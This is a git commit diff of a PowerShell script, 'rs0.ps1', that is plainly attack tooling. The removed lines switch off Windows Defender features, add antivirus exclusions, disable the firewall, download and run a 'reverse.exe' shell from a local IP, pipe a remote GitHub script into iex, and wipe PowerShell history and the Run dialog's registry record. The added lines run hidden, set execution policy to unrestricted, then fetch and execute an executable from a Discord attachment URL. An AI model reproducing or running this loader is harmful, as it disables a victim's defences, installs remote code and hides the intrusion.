2ec61aa70a7c6f6b22a5f204635003578ceb392e
Pancracio <38768857+Chapelo@users.noreply.github.com>
2024-08-04 01:16:04 +0200

    Update rs0.ps1

--- rs0.ps1
+++ rs0.ps1
@@ -1,16 +1,9 @@
 PowerShell.exe -WindowStyle hidden {
 
-    Set-ExecutionPolicy unrestricted -Force; 
-    # Desactivar Monitorización de Windows Defender (no 100%).
-    Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled;
-    # Agregar exclusion, desactivar Firewall, descargar y ejecutar shell.
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; Add-MpPreference -ExclusionPath "$env:TEMP" ; Add-MpPreference -ExclusionPath "$env:temp/" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
-    irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3.ps1 | iex;
-    # Eliminar Shell
-    # Remove-Item  $env:temp\rs.exe -Force -Recurse;
-    # Limpiar historial de powershell
-    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
-    # Limpiar ejecucion de powershell
-    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
+ 
+   Set-ExecutionPolicy unrestricted -Force;
+   Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1258904556398575775/1269432329000980613/rs2.exe?ex=66b00a7c&is=66aeb8fc&hm=e549af8175dc96c9f2c86e9c50eb2701e2890fc2c0d479750ef14902a54355d5&" -OutFile "$env:temp\rs2.exe"; powershell "$env:temp\rs2.exe";
+    
+
     
 }
